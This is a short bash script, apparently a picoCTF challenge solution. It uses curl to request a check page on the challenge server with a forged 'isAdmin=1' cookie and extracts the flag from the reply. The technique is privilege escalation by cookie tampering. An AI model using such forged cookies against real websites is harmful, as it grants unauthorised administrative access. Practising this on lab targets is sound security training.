#!/bin/bash

curl -s http://saturn.picoctf.net:52021/check.php --cookie "isAdmin=1" | grep -oE "picoCTF{.*}"
